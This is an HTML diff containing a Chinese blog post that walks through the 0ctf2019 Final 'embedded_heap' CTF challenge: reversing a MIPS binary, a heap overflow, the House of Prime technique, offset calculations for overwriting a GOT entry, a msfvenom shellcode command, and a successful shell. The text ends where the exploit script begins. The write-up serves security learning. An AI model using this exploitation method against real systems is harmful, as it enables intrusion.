@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="n74fzVGuzCcR7QhYWu-qaPH7lKOjZC3b3tDU0egKMNA" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="mips," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0ctf2019 Final embedded_heap题解这是0ctf2019决赛中的一道题，在网上搜了一下没找到与这道题有关的writeup，幸好当时存了有出题人分享的出题思路的ppt，对着ppt的思路把这道题做了一遍~ 相关文件在这里下载 题目分析这道题是mips架构的题，ida没法反编译成伪代码，所以直接逆向起来会比较难受。也有可以反编译mips的工具，反编译效果比较好的有jeb-mips">
+<meta name="keywords" content="mips">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0ctf2019 Final embedded_heap题解">
+<meta property="og:url" content="https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/index.html">
+<meta property="og:site_name" content="e3pem&#39;s Blog">
+<meta property="og:description" content="0ctf2019 Final embedded_heap题解这是0ctf2019决赛中的一道题，在网上搜了一下没找到与这道题有关的writeup，幸好当时存了有出题人分享的出题思路的ppt，对着ppt的思路把这道题做了一遍~ 相关文件在这里下载 题目分析这道题是mips架构的题，ida没法反编译成伪代码，所以直接逆向起来会比较难受。也有可以反编译mips的工具，反编译效果比较好的有jeb-mips">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190823121622.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190823134642.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190823135523.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190821164640.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190821164753.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190826110913.png">
+<meta property="og:updated_time" content="2019-08-26T03:38:54.719Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="0ctf2019 Final embedded_heap题解">
+<meta name="twitter:description" content="0ctf2019 Final embedded_heap题解这是0ctf2019决赛中的一道题，在网上搜了一下没找到与这道题有关的writeup，幸好当时存了有出题人分享的出题思路的ppt，对着ppt的思路把这道题做了一遍~ 相关文件在这里下载 题目分析这道题是mips架构的题，ida没法反编译成伪代码，所以直接逆向起来会比较难受。也有可以反编译mips的工具，反编译效果比较好的有jeb-mips">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190823121622.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/"/>
+
+
+
+
+
+  <title>0ctf2019 Final embedded_heap题解 | e3pem's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">e3pem's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="e3pem">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="e3pem's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">0ctf2019 Final embedded_heap题解</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:00:00+08:00">
+                2019-08-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0ctf2019-Final-embedded-heap题解"><a href="#0ctf2019-Final-embedded-heap题解" class="headerlink" title="0ctf2019 Final embedded_heap题解"></a>0ctf2019 Final embedded_heap题解</h2><p>这是0ctf2019决赛中的一道题，在网上搜了一下没找到与这道题有关的writeup，幸好当时存了有出题人分享的出题思路的ppt，对着ppt的思路把这道题做了一遍~</p>
+<p>相关文件<a href="https://github.com/e3pem/CTF/tree/master/0ctf2019/embedded_heap" target="_blank" rel="noopener">在这里下载</a></p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>这道题是mips架构的题，ida没法反编译成伪代码，所以直接逆向起来会比较难受。也有可以反编译mips的工具，反编译效果比较好的有<code>jeb-mips</code>，该工具是收费的。还有一款免费的由NSA开源的工具<code>ghidra</code>，该工具对mips的反编译效果也还可以，只是使用起来没有ida灵活。可以将ida和<code>ghidra</code>结合起来看，逆向起来会舒服很多，ghidra反编译出来的代码的结构以及函数调用的参数能帮我们更好的理解程序的逻辑。</p>
+<p>先查看程序开启了哪些保护措施，可以看到是保护全开：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/em/Desktop/ctf/0ctf2019/embedded_heap&apos;</span><br><span class="line">    Arch:     mips-32-big</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<p>程序在最开始的初始化过程中，mmap出来了一篇地址随机的内存，然后会分配数量随机在3~16之间chunk，chunk的大小也是随机的。chunk的结构体如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000 chunk           struc  # (sizeof=0xC, mappedto_5)</span><br><span class="line">00000000 flag:           .word ?</span><br><span class="line">00000004 size:           .word ?</span><br><span class="line">00000008 ptr:            .word ?</span><br><span class="line">0000000C chunk           ends</span><br></pre></td></tr></table></figure></p>
+<p>分配的chunk结构体则是保存在mmap出来的地址随机的内存处。</p>
+<p>后面就是程序功能实现部分，主要提供了<code>Update</code>、<code>View</code>、<code>Pwn</code>这三个功能。</p>
+<h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>分析该功能的逻辑，会发现里面存在着非常明显的堆溢出。程序会让用户输入一个值作为size，然后以读取size个字节到ptr指向内存（堆）中。用户可以指定任意大小的size，可以任意的堆溢出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ghidra对函数以及字符串的识别效果不太好，但能看到大致的逻辑</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FUN_0001157c</span><span class="params">(<span class="keyword">int</span> iParm1)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> iVar1;</span><br><span class="line">  <span class="keyword">int</span> iVar2;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">char</span> *)<span class="number">0x1f24</span>);</span><br><span class="line">  iVar1 = (*(code *)<span class="number">0xe5c</span>)(); <span class="comment">// 输入idx</span></span><br><span class="line">  <span class="keyword">if</span> (((iVar1 &lt; <span class="number">0</span>) || (<span class="number">0xf</span> &lt; iVar1)) || (*(<span class="keyword">int</span> *)(iParm1 + iVar1 * <span class="number">0xc</span>) != <span class="number">1</span>)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>((<span class="keyword">char</span> *)<span class="number">0x1f2c</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>((<span class="keyword">char</span> *)<span class="number">0x1f3c</span>);</span><br><span class="line">    iVar2 = (*(code *)<span class="number">0xe5c</span>)(); <span class="comment">// 输入size</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &lt; iVar2) &#123;</span><br><span class="line">      <span class="built_in">printf</span>((<span class="keyword">char</span> *)<span class="number">0x1f44</span>);</span><br><span class="line">      <span class="comment">// 根据size的值读取数据到堆中，堆溢出</span></span><br><span class="line">      (*(code *)<span class="number">0xad0</span>)(*(undefined4 *)(iParm1 + iVar1 * <span class="number">0xc</span> + <span class="number">8</span>),iVar2); </span><br><span class="line">      <span class="built_in">printf</span>((<span class="keyword">char</span> *)<span class="number">0x1f50</span>,iVar1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="View"><a href="#View" class="headerlink" title="View"></a>View</h3><p>该功能可以查看chunk中的数据，是根据size字段的值调用write函数来输出。</p>
+<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><p>看这个功能的名字就知道是出题人给的提示，要利用提供的这个功能来进行漏洞利用getshell。在pwn这个功能里面首先提供了两次free的机会，然后调用一次update之后程序就退出了</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190823121622.png" alt=""></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>经过前面的分析，可以知道程序存在堆溢出，有查看内存的功能，在<code>Pwn</code>功能里面有两次delete一次update的机会。这种情况下怎么利用漏洞呢？</p>
+<p>开了地址随机化，虽然可以任意的堆溢出，但是覆盖不到libc中去。chunk中不存在脏数据，泄露不出来地址，即使泄露出来地址了也没法任意地址写。</p>
+<p>所以重点应该放在<code>Pwn</code>功能里面，两次free能够做什么事情呢？目前遇到过的漏洞利用技术里面有哪一种是两次free就可以做到的？还真有，<code>House of Prime~</code></p>
+<h2 id="House-of-Prime"><a href="#House-of-Prime" class="headerlink" title="House of Prime"></a>House of Prime</h2><p>我也是到现在才知道有这个漏洞利用技巧的，最主要的原因是该利用技巧在现在版本的libc里面已经不适用了，所以一直没有接触到。详细的原理可以参见<a href="https://seclists.org/bugtraq/2005/Oct/118" target="_blank" rel="noopener">这里</a>，这里大致的介绍一下</p>
+<p>House of Prime需要在较老版本的libc里面才适用，该利用技术需要的条件是能够修改两个chunk的size字段，以及两次free。</p>
+<p>在以前版本的libc中，malloc_state结构体的内容如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The maximum chunk size to be eligible for fastbin */</span></span><br><span class="line">  <span class="keyword">size_t</span>  max_fast;   <span class="comment">/* low 2 bits used as flags */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr      fastbins[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr        top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr        last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr        bins[NBINS * <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins. Trailing zero map handles cases of largest binned size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span>     binmap[BINMAPSIZE+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Tunable parameters */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span>     trim_threshold;</span><br><span class="line">  <span class="keyword">size_t</span>  top_pad;</span><br><span class="line">  <span class="keyword">size_t</span>  mmap_threshold;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory map support */</span></span><br><span class="line">  <span class="keyword">int</span>              n_mmaps;</span><br><span class="line">  <span class="keyword">int</span>              n_mmaps_max;</span><br><span class="line">  <span class="keyword">int</span>              max_n_mmaps;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Cache malloc_getpagesize */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span>     pagesize;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Track properties of MORECORE */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span>     morecore_properties;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Statistics */</span></span><br><span class="line">  <span class="keyword">size_t</span>  mmapped_mem;</span><br><span class="line">  <span class="keyword">size_t</span>  sbrked_mem;</span><br><span class="line">  <span class="keyword">size_t</span>  max_sbrked_mem;</span><br><span class="line">  <span class="keyword">size_t</span>  max_mmapped_mem;</span><br><span class="line">  <span class="keyword">size_t</span>  max_total_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>观察一下，发现重要的字段和现在版本的malloc_state是差不多的。看里面的第一个字段<code>max_fast</code>，这个字段是用来记录fastbin最大允许的大小是多少的，就相当于现在的<code>global_max_fast</code>，只不过<code>global_max_fast</code>被移到<code>malloc_state</code>结构体外面了。</p>
+<p>结构体中的<code>max_fast</code>紧邻的是fastbins数组，如果释放的chunk属于fastbin范围内，便会把该chunk的地址保存到fastbins这个数组对应的下标处。<code>House of Prime</code>的关键点也就在这里了！</p>
+<h3 id="第一次free"><a href="#第一次free" class="headerlink" title="第一次free"></a>第一次free</h3><p>计算chunk所属fastbin的idx过程为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)        ((((unsigned int)(sz)) &gt;&gt; 3) - 2)</span></span><br></pre></td></tr></table></figure>
+<p>如果这里的sz为8的话结果会怎样？<code>(8&gt;&gt;3)-2=(1)-2=-1</code></p>
+<p>所以如果释放的chunk的size字段被改成了8，那么该chunk放入fastbin的时候便会放到<code>&amp;fastbins[-1]</code>这里，该地址刚好就是<code>max_fast</code>所在的地址，根据chunk放入fastbin的链表的操作，该chunk会被放入链表头，也就是<code>max_fast</code>的值会被设置成该chunk的地址（一个很大的值）</p>
+<h3 id="第二次free"><a href="#第二次free" class="headerlink" title="第二次free"></a>第二次free</h3><p>经过第一次free，<code>max_fast</code>的值被设置的非常大，这就导致很大的size的chunk都会被当成fastbin对待，所以如果控制chunk的size为一个合适的值，那么他在free之后会被放入到<code>fastbin</code>中（实际上已经超出了fastbins的范围），就可以实现往<code>&quot;任意地址&quot;</code>(其实是malloc_state地址之后的大部分地址)写入堆地址的目的了！</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>了解了<code>House of Prime</code>，再回过来看这道题，程序有堆溢出，可以任意的修改chunk的size字段。在<code>Pwn</code>中刚好提供了两次free，也刚好满足了<code>House of Prime</code>的利用条件，所以能达到的效果就是往某个libc或ld.so地址处写入堆地址。</p>
+<p>对于如何运行并调试该程序，可以参考我的上一篇文章<a href="https://e3pem.github.io/2019/08/23/mips-pwn/mips-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">mips-pwn环境搭建</a></p>
+<h3 id="寻找待覆盖地址"><a href="#寻找待覆盖地址" class="headerlink" title="寻找待覆盖地址"></a>寻找待覆盖地址</h3><p>现在可以往某个地址写入堆地址，那么该往哪里写入才能控制程序的流程呢？</p>
+<p>我们知道动态编译的程序运行离不开<code>ld.so</code>，该so负责在程序运行之前加载相应的so库，以及在程序结束运行之后做好相应的清理工作，而且这道题在调用两次delete以及一次update之后便结束运行了，那么要控制程序流程，应该想着从程序结束后进行的操作上入手了。</p>
+<p>直接跟踪程序exit之后进行的操作，跟了一会儿之后会发现程序进入到了<code>ld-uClibc-0.9.33.2.so</code>的内存范围内执行了，查看其偏移，发现是进入到了<code>_dl_app_fini_array</code>函数中，然后在该函数中又调用了<code>_dl_run_fini_array</code>：</p>
+<figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.globl _dl_app_fini_array</span><br><span class="line"><span class="symbol">_dl_app_fini_array:</span></span><br><span class="line"></span><br><span class="line">var_4= -<span class="number">4</span></span><br><span class="line"></span><br><span class="line">li      $<span class="built_in">gp</span>, <span class="number">0x1D8B4</span></span><br><span class="line"><span class="keyword">addu </span>   $<span class="built_in">gp</span>, $<span class="built_in">t9</span></span><br><span class="line">la      $<span class="built_in">v0</span>, _dl_loaded_modules</span><br><span class="line"><span class="keyword">addiu </span>  $<span class="built_in">sp</span>, -<span class="number">8</span></span><br><span class="line">la      $<span class="built_in">t9</span>, _dl_run_fini_array</span><br><span class="line"><span class="keyword">sw </span>     $<span class="built_in">fp</span>, <span class="number">8</span>+var_4($<span class="built_in">sp</span>)</span><br><span class="line"><span class="keyword">move </span>   $<span class="built_in">fp</span>, $<span class="built_in">sp</span></span><br><span class="line"><span class="keyword">lw </span>     $<span class="built_in">a0</span>, (_dl_loaded_modules - <span class="number">0x1718C</span>)($<span class="built_in">v0</span>)</span><br><span class="line"><span class="keyword">move </span>   $<span class="built_in">sp</span>, $<span class="built_in">fp</span></span><br><span class="line"><span class="keyword">lw </span>     $<span class="built_in">fp</span>, <span class="number">8</span>+var_4($<span class="built_in">sp</span>)</span><br><span class="line"><span class="keyword">jr </span>     $<span class="built_in">t9</span> <span class="comment">; _dl_run_fini_array</span></span><br><span class="line"><span class="keyword">addiu </span>  $<span class="built_in">sp</span>, <span class="number">8</span></span><br></pre></td></tr></table></figure>
+<p>语句<code>la $t9, _dl_run_fini_array</code>是取got表中的<code>_dl_run_fini_array</code>的值，然后跳转到t9处执行<code>jr $t9</code>。</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190823134642.png" alt=""></p>
+<p>能修改<code>_dl_run_fini_array</code>的值吗？如果可以的话就能通过该值劫持程序的流程了！</p>
+<h3 id="验证可行性"><a href="#验证可行性" class="headerlink" title="验证可行性"></a>验证可行性</h3><p>程序开启了<code>Full RELRO</code>，但是调试的时候发现这块内存的属性仍然是<code>可读写</code>的，不清楚到底是qemu模拟的问题，还是mips架构本来就不支持<code>Full RELRO</code>，既然这里内存属性可读写，那么就先考虑修改该值来控制程序流程吧（如果真实设备上不可以的话修改其他值的方法和效果也是一样的）</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190823135523.png" alt=""></p>
+<p>要修改<code>_dl_run_fini_array</code>，还需要一个条件：<code>libc.so的加载基址和ld.so的加载基址之间的偏移是固定的</code>。因为<code>malloc_state</code>是在libc中的，<code>_dl_run_fini_array</code>是在<code>ld.so</code>中的。经过调试发现这两个so库的加载地址偏移确实是固定的：</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190821164640.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190821164753.png" alt=""></p>
+<p>上面是程序运行分别运行两次的vmmap信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">picture 1: 0x77456000-0x773ee000=0x68000</span><br><span class="line">picture 2: 0x77a27000-0x779bf000=0x68000</span><br></pre></td></tr></table></figure></p>
+<h3 id="计算size"><a href="#计算size" class="headerlink" title="计算size"></a>计算size</h3><p>所以现在只需要计算覆盖到<code>_dl_run_fini_array</code>时对应的chunk的size是多少，然后通过第二次free便能将堆地址写入到<code>got@_dl_run_fini_array</code>，进而程序在exit过程中会跳转到第二次free的chunk处去执行。计算用到的一些地址偏移如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># libuClibc.so</span><br><span class="line">__malloc_state --&gt; 0x66d7c</span><br><span class="line"></span><br><span class="line"># ld-uClibc.so</span><br><span class="line">got@_dl_run_fini_array --&gt; 0x17064 </span><br><span class="line"></span><br><span class="line"># ld.so和libc.so的偏移</span><br><span class="line">offset --&gt; 0x68000</span><br></pre></td></tr></table></figure>
+<p>从<code>&amp;fastbins[0]</code>到目的地址<code>got@_dl_run_fini_array</code>之间的偏移为：<code>0x68000+0x17064-(0x66d7c+4)=0x182e4</code>，故目的地址对应的fastbin下标idx应为<code>0x182e4/4=0x6b09</code>。再根据计算fastbin idx的方式，推出对应的size为<code>0x10+0x6b09*8=0x305d8</code>，应将<code>prev_inuse</code>标志位算上，那么最终size字段的值为<code>0x305d9</code></p>
+<h3 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h3><p>程序最后要跳转到我们的shellcode处执行，我这里采用的是msfvenom生成shellcode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/mipsbe/exec CMD=&quot;/bin/sh&quot; -f python -o ~/Desktop/tmp/shellcodemips.txt</span><br></pre></td></tr></table></figure>
+<p>到这里可能还有一个疑问，程序不是开启了<code>NX</code>保护吗？这里是把程序执行流劫持到了堆上，shellcode应该不能执行才对啊！其实<strong>mips的设备是不支持NX的</strong>，从vmmap出来的结果也可以看到堆是具有<code>rwx</code>权限的！</p>
+<p>成功getshell：</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190826110913.png" alt=""></p>
+<p>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 